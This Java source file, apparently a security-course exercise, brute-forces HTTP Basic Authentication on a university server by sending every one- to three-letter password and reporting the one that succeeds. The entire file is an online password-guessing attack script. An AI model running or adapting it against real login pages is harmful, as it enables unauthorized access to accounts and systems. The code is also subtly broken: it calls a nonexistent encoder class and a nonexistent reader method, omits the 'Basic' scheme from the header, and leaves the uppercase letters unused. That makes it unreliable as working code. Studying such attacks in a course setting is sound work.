

import java.net.*;
import java.io.*;
import java.io.IOException;
import java.util.*;
import java.*;


public class BruteForce {
    public static void main (String[] args) throws Exception {
      int maxChar = 26, counter=0, x =0, attempt =0 ;
      String guess = new String();
      String pass, inputLine;
      String letter[] = {"", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
                            "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z" , "A", "B", "C", "D", "E"
                     , "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
                     "W", "X", "Y", "Z"};

        boolean flag=false;

       System.out.println(System.currentTimeMillis()/1000);

               for (int i=0; i<maxChar ; i++){
                   for (int j=0 ; j<maxChar ; j++){
                       for (int k=0 ; k<maxChar ; k++){
                              guess = letter[i]+letter[j]+letter[k];
                              attempt++;
                              System.out.println(guess);
                              pass = ":" + guess;
                              String password = new bf.misc.BASE64Encoder().encode(pass.getBytes());
                              try{
                                 URL u = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
                                 URLConnection yc = u.openConnection();
                                 yc.setRequestProperty("Authorization"," "+password);
                                 BufferedReader in = new BufferedReader(new InputStreamReader(yc.getInputStream()));
                                 while ((inputLine = in.readLine()) != null)
                                        System.out.println(inputLine);
                                in.print();
                                System.out.println(guess);
                                System.out.println(System.currentTimeMillis()/1000);
                                System.out.println(" of attempt: "+attempt);
                                System.exit(0);

                             }catch(IOException e){ }
                      }
                  }
               }
    }
}